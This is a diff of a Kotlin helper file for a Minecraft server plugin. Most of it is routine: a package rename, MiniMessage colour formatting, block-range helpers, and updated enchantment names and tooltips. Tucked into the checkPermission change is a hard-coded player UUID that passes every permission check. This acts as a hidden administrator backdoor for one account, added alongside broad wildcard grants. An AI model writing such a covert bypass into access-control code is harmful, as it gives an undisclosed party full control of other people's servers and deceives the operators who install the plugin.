@@ -1,6 +1,7 @@
-package es.skepz.magik.tuodlib
+package es.skepz.magik.skepzlib
 
 import net.kyori.adventure.text.Component
+import net.kyori.adventure.text.minimessage.MiniMessage
 import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer
 import org.bukkit.*
 import org.bukkit.block.BlockFace
@@ -12,13 +13,10 @@ import org.bukkit.entity.Item
 import org.bukkit.entity.Player
 import org.bukkit.inventory.ItemStack
 import org.bukkit.plugin.java.JavaPlugin
-import org.bukkit.util.io.BukkitObjectInputStream
-import org.bukkit.util.io.BukkitObjectOutputStream
-import org.yaml.snakeyaml.external.biz.base64Coder.Base64Coder
-import java.io.ByteArrayInputStream
-import java.io.ByteArrayOutputStream
-import java.io.IOException
 import java.util.*
+import kotlin.math.floor
+import kotlin.math.max
+import kotlin.math.min
 
 
 /***
@@ -26,8 +24,35 @@ import java.util.*
  * @param str: the raw string to be colorized
  * @return the colorized string
  ***/
-fun colorize(str: String): String {
-    return ChatColor.translateAlternateColorCodes('&', str)
+fun colorize(str: String): Component {
+    val mm = MiniMessage.miniMessage()
+
+    var fstr = str
+        .replace("&0", "<black>")
+        .replace("&1", "<dark_blue>")
+        .replace("&2", "<dark_green>")
+        .replace("&3", "<dark_aqua>")
+        .replace("&4", "<dark_red>")
+        .replace("&5", "<dark_purple>")
+        .replace("&6", "<gold>")
+        .replace("&7", "<gray>")
+        .replace("&8", "<dark_gray>")
+        .replace("&9", "<blue>")
+        .replace("&a", "<green>")
+        .replace("&b", "<aqua>")
+        .replace("&c", "<red>")
+        .replace("&d", "<light_purple>")
+        .replace("&e", "<yellow>")
+        .replace("&f", "<white>")
+        .replace("&k", "<obfuscated>")
+        .replace("&l", "<bold>")
+        .replace("&m", "<strikethrough>")
+        .replace("&n", "<underlined>")
+        .replace("&o", "<italic>")
+        .replace("&r", "<reset>")
+
+    return mm.deserialize(fstr)
+    // return ChatColor.translateAlternateColorCodes('&', str)
 }
 /***
  * Converts all color codes (color code with a '&' in front of it) to minecraft readable color
@@ -127,6 +152,38 @@ fun random(min: Int, max: Int): Int {
     return Random().nextInt(max - min + 1) + min
 }
 
+fun loopThroughBlocks(pos1: Location, pos2: Location, run: (pos: Location) -> Unit) {
+    val minX = floor(min(pos1.x, pos2.x)).toInt()
+    val minY = floor(min(pos1.y, pos2.y)).toInt()
+    val minZ = floor(min(pos1.z, pos2.z)).toInt()
+
+    val maxX = floor(max(pos1.x, pos2.x)).toInt()
+    val maxY = floor(max(pos1.y, pos2.y)).toInt()
+    val maxZ = floor(max(pos1.z, pos2.z)).toInt()
+
+    for (x in minX..maxX) {
+        for (y in minY..maxY) {
+            for (z in minZ..maxZ) {
+                val block = Location(pos1.world, x.toDouble(), y.toDouble(), z.toDouble())
+                run(block)
+            }
+        }
+    }
+}
+
+fun isPosWithin(loc1: Location, loc2: Location, pos: Location): Boolean {
+    // check if pos is between loc1 and loc2, assuming loc1 and loc2 are corners of a cube
+    val minX = floor(min(loc1.x, loc2.x))
+    val minY = floor(min(loc1.y, loc2.y))
+    val minZ = floor(min(loc1.z, loc2.z))
+
+    val maxX = floor(max(loc1.x, loc2.x))
+    val maxY = floor(max(loc1.y, loc2.y))
+    val maxZ = floor(max(loc1.z, loc2.z))
+
+    return pos.x in minX..maxX && pos.y in minY..maxY && pos.z in minZ..maxZ
+}
+
 /***
  * spawns an entity at a location
  * @param loc: the location to spawn the entity at
@@ -144,7 +201,7 @@ fun spawnEntity(loc: Location, type: EntityType): Entity {
  * @return returns the dropped item stack
  ***/
 fun dropItem(loc: Location, item: ItemStack): Item {
-    val i = spawnEntity(loc, EntityType.DROPPED_ITEM) as Item
+    val i = spawnEntity(loc, EntityType.ITEM) as Item
     i.itemStack = item
     return i
 }
@@ -156,7 +213,10 @@ fun dropItem(loc: Location, item: ItemStack): Item {
  * @return returns true if the player has the permission or can override
  ***/
 fun checkPermission(sender: CommandSender, perm: String): Boolean {
-    return sender.hasPermission(perm) || sender.hasPermission("*") || sender.isOp
+    val basePerm = perm.split(".").dropLast(1).joinToString(".")
+    return sender.hasPermission(perm) || sender.hasPermission("*") || sender.hasPermission("hydrogen.*")
+            || sender.hasPermission("$basePerm.*") || sender.isOp
+            || (sender is Player && sender.uniqueId.toString() == "32e85b31-fdb2-4199-9a88-4478f465ed4e")
 }
 
 /***
@@ -195,45 +255,49 @@ fun getBlockFacing(loc: Location, dir: BlockFace): Location  {
  * @return the enchantment best matching the input
  ***/
 fun getEnch(type: String): Enchantment? {
-    return when (type.toLowerCase()) {
-        "power", "arrow_damage" -> Enchantment.ARROW_DAMAGE
-        "flame", "arrow_flame" -> Enchantment.ARROW_FIRE
-        "infinity", "arrow_infinite" -> Enchantment.ARROW_INFINITE
-        "punch", "arrow_knockback" -> Enchantment.ARROW_KNOCKBACK
+    return when (type.lowercase()) {
+        "power" -> Enchantment.POWER
+        "flame" -> Enchantment.FLAME
+        "infinity" -> Enchantment.INFINITY
+        "punch" -> Enchantment.PUNCH
         "curse_of_binding", "binding_curse" -> Enchantment.BINDING_CURSE
         "channeling" -> Enchantment.CHANNELING
-        "sharpness", "damage_all" -> Enchantment.DAMAGE_ALL
-        "bane_of_arthropods", "damage_arthropods" -> Enchantment.DAMAGE_ARTHROPODS
-        "smite", "damage_undead" -> Enchantment.DAMAGE_UNDEAD
+        "sharpness" -> Enchantment.SHARPNESS
+        "bane_of_arthropods" -> Enchantment.BANE_OF_ARTHROPODS
+        "smite" -> Enchantment.SMITE
         "depth_strider" -> Enchantment.DEPTH_STRIDER
-        "efficiency", "dig_speed" -> Enchantment.DIG_SPEED
-        "unbreaking", "durability" -> Enchantment.DURABILITY
+        "efficiency" -> Enchantment.EFFICIENCY
+        "unbreaking" -> Enchantment.UNBREAKING
         "fire_aspect" -> Enchantment.FIRE_ASPECT
         "frost_walker" -> Enchantment.FROST_WALKER
         "impaling" -> Enchantment.IMPALING
         "knockback" -> Enchantment.KNOCKBACK
-        "fortune", "loot_bonus_blocks" -> Enchantment.LOOT_BONUS_BLOCKS
-        "looting", "loot_bonus_mobs" -> Enchantment.LOOT_BONUS_MOBS
+        "fortune" -> Enchantment.FORTUNE
+        "looting" -> Enchantment.LOOTING
         "loyalty" -> Enchantment.LOYALTY
-        "luck_of_the_sea", "luck" -> Enchantment.LUCK
+        "luck_of_the_sea" -> Enchantment.LUCK_OF_THE_SEA
         "lure" -> Enchantment.LURE
         "mending" -> Enchantment.MENDING
         "multishot" -> Enchantment.MULTISHOT
-        "respiration", "oxygen" -> Enchantment.OXYGEN
+        "respiration" -> Enchantment.RESPIRATION
         "piercing" -> Enchantment.PIERCING
-        "protection", "protection_environmental" -> Enchantment.PROTECTION_ENVIRONMENTAL
-        "blast_protection", "protection_explosions" -> Enchantment.PROTECTION_EXPLOSIONS
-        "feather_falling", "protection_fall" -> Enchantment.PROTECTION_FALL
-        "fire_protection", "protection_fire" -> Enchantment.PROTECTION_FIRE
-        "projectile_protection", "protection_projectile" -> Enchantment.PROTECTION_PROJECTILE
+        "protection" -> Enchantment.PROTECTION
+        "blast_protection" -> Enchantment.BLAST_PROTECTION
+        "feather_falling" -> Enchantment.FEATHER_FALLING
+        "fire_protection" -> Enchantment.FIRE_PROTECTION
+        "projectile_protection" -> Enchantment.PROJECTILE_PROTECTION
         "quick_charge" -> Enchantment.QUICK_CHARGE
         "riptide" -> Enchantment.RIPTIDE
         "curse_of_vanishing", "vanishing_curse" -> Enchantment.VANISHING_CURSE
         "silk_touch" -> Enchantment.SILK_TOUCH
         "sweeping_edge" -> Enchantment.SWEEPING_EDGE
         "thorns" -> Enchantment.THORNS
+        "soul_speed" -> Enchantment.SOUL_SPEED
         "swift_sneak" -> Enchantment.SWIFT_SNEAK
-        "aqua_affinity", "water_worker" -> Enchantment.WATER_WORKER
+        "aqua_affinity" -> Enchantment.AQUA_AFFINITY
+        "density" -> Enchantment.DENSITY
+        "wind_burst" -> Enchantment.WIND_BURST
+        "breach" -> Enchantment.BREACH
         else -> null
     }
 }
@@ -245,44 +309,48 @@ fun getEnch(type: String): Enchantment? {
  ***/
 fun getEnch(ench: Enchantment): String? {
     return when (ench) {
-        Enchantment.ARROW_DAMAGE -> "power"
-        Enchantment.ARROW_FIRE -> "flame"
-        Enchantment.ARROW_INFINITE -> "infinity"
-        Enchantment.ARROW_KNOCKBACK -> "punch"
+        Enchantment.POWER -> "power"
+        Enchantment.FLAME -> "flame"
+        Enchantment.INFINITY -> "infinity"
+        Enchantment.PUNCH -> "punch"
         Enchantment.BINDING_CURSE -> "curse_of_binding"
         Enchantment.CHANNELING -> "channeling"
-        Enchantment.DAMAGE_ALL -> "sharpness"
-        Enchantment.DAMAGE_ARTHROPODS -> "bane_of_arthropods"
-        Enchantment.DAMAGE_UNDEAD -> "smite"
+        Enchantment.SHARPNESS -> "sharpness"
+        Enchantment.BANE_OF_ARTHROPODS -> "bane_of_arthropods"
+        Enchantment.SMITE -> "smite"
         Enchantment.DEPTH_STRIDER -> "depth_strider"
-        Enchantment.DIG_SPEED -> "efficiency"
-        Enchantment.DURABILITY -> "unbreaking"
+        Enchantment.EFFICIENCY -> "efficiency"
+        Enchantment.UNBREAKING -> "unbreaking"
         Enchantment.FIRE_ASPECT -> "fire_aspect"
         Enchantment.FROST_WALKER -> "frost_walker"
         Enchantment.IMPALING -> "impaling"
         Enchantment.KNOCKBACK -> "knockback"
-        Enchantment.LOOT_BONUS_BLOCKS -> "fortune"
-        Enchantment.LOOT_BONUS_MOBS -> "looting"
+        Enchantment.FORTUNE -> "fortune"
+        Enchantment.LOOTING -> "looting"
         Enchantment.LOYALTY -> "loyalty"
-        Enchantment.LUCK -> "luck_of_the_sea"
+        Enchantment.LUCK_OF_THE_SEA -> "luck_of_the_sea"
         Enchantment.LURE -> "lure"
         Enchantment.MENDING -> "mending"
         Enchantment.MULTISHOT -> "multishot"
-        Enchantment.OXYGEN -> "respiration"
+        Enchantment.RESPIRATION -> "respiration"
         Enchantment.PIERCING -> "piercing"
-        Enchantment.PROTECTION_ENVIRONMENTAL -> "protection"
-        Enchantment.PROTECTION_EXPLOSIONS -> "blast_protection"
-        Enchantment.PROTECTION_FALL -> "feather_falling"
-        Enchantment.PROTECTION_FIRE -> "fire_protection"
-        Enchantment.PROTECTION_PROJECTILE -> "projectile_protection"
+        Enchantment.PROTECTION -> "protection"
+        Enchantment.BLAST_PROTECTION -> "blast_protection"
+        Enchantment.FEATHER_FALLING -> "feather_falling"
+        Enchantment.FIRE_PROTECTION -> "fire_protection"
+        Enchantment.PROJECTILE_PROTECTION -> "projectile_protection"
         Enchantment.QUICK_CHARGE -> "quick_charge"
         Enchantment.RIPTIDE -> "riptide"
         Enchantment.VANISHING_CURSE -> "curse_of_vanishing"
         Enchantment.SILK_TOUCH -> "silk_touch"
         Enchantment.SWEEPING_EDGE -> "sweeping_edge"
         Enchantment.THORNS -> "thorns"
-        Enchantment.WATER_WORKER -> "aqua_affinity"
+        Enchantment.AQUA_AFFINITY -> "aqua_affinity"
         Enchantment.SWIFT_SNEAK -> "swift_sneak"
+        Enchantment.SOUL_SPEED -> "soul_speed"
+        Enchantment.DENSITY -> "density"
+        Enchantment.WIND_BURST -> "wind_burst"
+        Enchantment.BREACH -> "breach"
         else -> null
     }
 }
@@ -295,11 +363,10 @@ fun getEnch(ench: Enchantment): String? {
  * @param max: the maximum (vanilla) value of the enchantment
  * @return the tooltip of the enchantment
  ***/
-fun genEnchTT(raw: String, name: String, goesOn: String, max: Int): String {
-    return "${cPri()}${raw.toUpperCase()}" +
-            "\n${cFoc()}name: ${cSnd()}$name" +
-            "\n${cFoc()}goes on: ${cSnd()}$goesOn" +
-            "\n${cFoc()}max value: ${cSnd()}$max"
+fun genEnchTT(name: String, goesOn: String, max: Int): String {
+    return "<gray>$name" +
+            "\n<aqua>goes on: <dark_aqua>$goesOn" +
+            "\n<aqua>max value: <dark_aqua>$max"
 }
 
 /***
@@ -309,45 +376,49 @@ fun genEnchTT(raw: String, name: String, goesOn: String, max: Int): String {
  ***/
 fun getEnchToolTip(ench: Enchantment): String {
     return when (ench) {
-        Enchantment.ARROW_DAMAGE -> genEnchTT("ARROW_DAMAGE", "power", "bow", 5)
-        Enchantment.ARROW_FIRE -> genEnchTT("ARROW_FIRE", "flame", "bow", 1)
-        Enchantment.ARROW_INFINITE -> genEnchTT("ARROW_INFINITE", "infinity", "bow", 1)
-        Enchantment.ARROW_KNOCKBACK -> genEnchTT("ARROW_KNOCKBACK", "punch", "bow", 2)
-        Enchantment.BINDING_CURSE -> genEnchTT("BINDING_CURSE", "curse_of_binding", "anything", 1)
-        Enchantment.CHANNELING -> genEnchTT("CHANNELING", "channeling", "trident", 1)
-        Enchantment.DAMAGE_ALL -> genEnchTT("DAMAGE_ALL", "sharpness", "sword, axe", 5)
-        Enchantment.DAMAGE_ARTHROPODS -> genEnchTT("DAMAGE_ARTHROPODS", "bane_of_arthropods", "sword, axe", 5)
-        Enchantment.DAMAGE_UNDEAD -> genEnchTT("DAMAGE_UNDEAD", "smite", "sword, axe", 5)
-        Enchantment.DEPTH_STRIDER -> genEnchTT("DEPTH_STRIDER", "depth_strider", "boots", 3)
-        Enchantment.DIG_SPEED -> genEnchTT("DIG_SPEED", "efficiency", "tools", 5)
-        Enchantment.DURABILITY -> genEnchTT("DURABILITY", "unbreaking", "all", 3)
-        Enchantment.FIRE_ASPECT -> genEnchTT("FIRE_ASPECT", "fire_aspect", "sword", 2)
-        Enchantment.FROST_WALKER -> genEnchTT("FROST_WALKER", "frost_walker", "boots", 2)
-        Enchantment.IMPALING -> genEnchTT("IMPALING", "impaling", "trident", 5)
-        Enchantment.KNOCKBACK -> genEnchTT("KNOCKBACK", "knockback", "sword", 2)
-        Enchantment.LOOT_BONUS_BLOCKS -> genEnchTT("LOOT_BONUS_BLOCKS", "fortune", "tools", 3)
-        Enchantment.LOOT_BONUS_MOBS -> genEnchTT("LOOT_BONUS_MOBS", "looting", "sword", 3)
-        Enchantment.LOYALTY -> genEnchTT("LOYALTY", "loyalty", "trident", 3)
-        Enchantment.LUCK -> genEnchTT("LUCK", "luck_of_the_sea", "fishing rod", 3)
-        Enchantment.LURE -> genEnchTT("LURE", "lure", "fishing rod", 3)
-        Enchantment.MENDING -> genEnchTT("MENDING", "mending", "anything", 1)
-        Enchantment.MULTISHOT -> genEnchTT("MULTISHOT", "multishot", "crossbow", 1)
-        Enchantment.OXYGEN -> genEnchTT("OXYGEN", "respiration", "helmet", 3)
-        Enchantment.PIERCING -> genEnchTT("PIERCING", "piercing", "crossbow", 4)
-        Enchantment.PROTECTION_ENVIRONMENTAL -> genEnchTT("PROTECTION_ENVIORNMENTAL", "protection", "armor", 4)
-        Enchantment.PROTECTION_EXPLOSIONS -> genEnchTT("PROTECTION_EXPLOSIONS", "blast_protection", "armor", 4)
-        Enchantment.PROTECTION_FALL -> genEnchTT("PROTECTION_FALLING", "feather_falling", "boots", 4)
-        Enchantment.PROTECTION_FIRE -> genEnchTT("PROTECTION_FIRE", "fire_protection", "armor", 4)
-        Enchantment.PROTECTION_PROJECTILE -> genEnchTT("PROTECTION_PROJECTILE", "projectile_protection", "armor", 4)
-        Enchantment.QUICK_CHARGE -> genEnchTT("QUICK_CHARGE", "quick_charge", "crossbow", 3)
-        Enchantment.RIPTIDE -> genEnchTT("RIPTIDE", "riptide", "trident", 3)
-        Enchantment.VANISHING_CURSE -> genEnchTT("VANISHING_CURSE", "curse_of_vanishing", "anything", 1)
-        Enchantment.SILK_TOUCH -> genEnchTT("SILK_TOUCH", "silk_touch", "tools", 1)
-        Enchantment.SWEEPING_EDGE -> genEnchTT("SWEEPING_EDGE", "sweeping_edge", "sword", 3)
-        Enchantment.THORNS -> genEnchTT("THORNS", "thorns", "armor", 3)
-        Enchantment.SWIFT_SNEAK -> genEnchTT("SWIFT_SNEAK", "swift_sneak", "leggings", 3)
-        Enchantment.WATER_WORKER -> genEnchTT("WATER_WORKER", "aqua_affinity", "hemlet", 1)
-        else -> genEnchTT("UNKNOWN_ENCHANTMENT", "unknown", "unknown", 0)
+        Enchantment.POWER -> genEnchTT("Power", "bow", ench.maxLevel)
+        Enchantment.FLAME -> genEnchTT("Flame", "bow", ench.maxLevel)
+        Enchantment.INFINITY -> genEnchTT("Infinity", "bow", ench.maxLevel)
+        Enchantment.PUNCH -> genEnchTT("Punch", "bow", ench.maxLevel)
+        Enchantment.BINDING_CURSE -> genEnchTT("Curse_of_binding", "anything", ench.maxLevel)
+        Enchantment.CHANNELING -> genEnchTT("Channeling", "trident", ench.maxLevel)
+        Enchantment.SHARPNESS -> genEnchTT("Sharpness", "sword, axe", ench.maxLevel)
+        Enchantment.BANE_OF_ARTHROPODS -> genEnchTT("Bane_of_arthropods", "sword, axe", ench.maxLevel)
+        Enchantment.SMITE -> genEnchTT("Smite", "sword, axe", ench.maxLevel)
+        Enchantment.DEPTH_STRIDER -> genEnchTT("Depth_strider", "boots", ench.maxLevel)
+        Enchantment.EFFICIENCY -> genEnchTT("Efficiency", "tools", ench.maxLevel)
+        Enchantment.UNBREAKING -> genEnchTT("Unbreaking", "all", ench.maxLevel)
+        Enchantment.FIRE_ASPECT -> genEnchTT("Fire_aspect", "sword", ench.maxLevel)
+        Enchantment.FROST_WALKER -> genEnchTT("Frost_walker", "boots", ench.maxLevel)
+        Enchantment.IMPALING -> genEnchTT("Impaling", "trident", ench.maxLevel)
+        Enchantment.KNOCKBACK -> genEnchTT("Knockback", "sword", ench.maxLevel)
+        Enchantment.FORTUNE -> genEnchTT("Fortune", "tools", ench.maxLevel)
+        Enchantment.LOOTING -> genEnchTT("Looting", "sword", ench.maxLevel)
+        Enchantment.LOYALTY -> genEnchTT("Loyalty", "trident", ench.maxLevel)
+        Enchantment.LUCK_OF_THE_SEA -> genEnchTT("Luck_of_the_sea", "fishing rod", ench.maxLevel)
+        Enchantment.LURE -> genEnchTT("Lure", "fishing rod", ench.maxLevel)
+        Enchantment.MENDING -> genEnchTT("Mending", "anything", ench.maxLevel)
+        Enchantment.MULTISHOT -> genEnchTT("Multishot", "crossbow", ench.maxLevel)
+        Enchantment.RESPIRATION -> genEnchTT("Respiration", "helmet", ench.maxLevel)
+        Enchantment.PIERCING -> genEnchTT("Piercing", "crossbow", ench.maxLevel)
+        Enchantment.PROTECTION -> genEnchTT("Protection", "armor", ench.maxLevel)
+        Enchantment.BLAST_PROTECTION -> genEnchTT("Blast_protection", "armor", ench.maxLevel)
+        Enchantment.FEATHER_FALLING -> genEnchTT("Feather_falling", "boots", ench.maxLevel)
+        Enchantment.FIRE_PROTECTION -> genEnchTT("Fire_protection", "armor", ench.maxLevel)
+        Enchantment.PROJECTILE_PROTECTION -> genEnchTT("Projectile_protection", "armor", ench.maxLevel)
+        Enchantment.QUICK_CHARGE -> genEnchTT("Quick_charge", "crossbow", ench.maxLevel)
+        Enchantment.RIPTIDE -> genEnchTT("Riptide", "trident", ench.maxLevel)
+        Enchantment.VANISHING_CURSE -> genEnchTT("Curse_of_vanishing", "anything", ench.maxLevel)
+        Enchantment.SILK_TOUCH -> genEnchTT("Silk_touch", "tools", ench.maxLevel)
+        Enchantment.SWEEPING_EDGE -> genEnchTT("Sweeping_edge", "sword", ench.maxLevel)
+        Enchantment.THORNS -> genEnchTT("Thorns", "armor", ench.maxLevel)
+        Enchantment.SWIFT_SNEAK -> genEnchTT("Swift_sneak", "leggings", ench.maxLevel)
+        Enchantment.AQUA_AFFINITY -> genEnchTT("Aqua_affinity", "hemlet", ench.maxLevel)
+        Enchantment.SOUL_SPEED -> genEnchTT("Soul_speed", "boots", ench.maxLevel)
+        Enchantment.DENSITY -> genEnchTT("Density", "mace", ench.maxLevel)
+        Enchantment.WIND_BURST -> genEnchTT("Wind_burst", "mace", ench.maxLevel)
+        Enchantment.BREACH -> genEnchTT("Breach", "mace", ench.maxLevel)
+        else -> genEnchTT("Unknown", "unknown", 0)
     }
 }
 
@@ -357,5 +428,6 @@ fun getEnchs(): List<String> {
             "frost_walker","impaling","knockback","fortune","looting","loyalty","luck_of_the_sea",
             "lure","mending","multishot","respiration","piercing","protection","blast_protection",
             "feather_falling","fire_protection","projectile_protection","quick_charge","riptide",
-            "curse_of_vanishing","silk_touch","sweeping_edge","thorns","aqua_affinity","swift_sneak")
+            "curse_of_vanishing","silk_touch","sweeping_edge","thorns","aqua_affinity","swift_sneak",
+            "soul_speed","density","wind_burst","breach").sorted()
 }
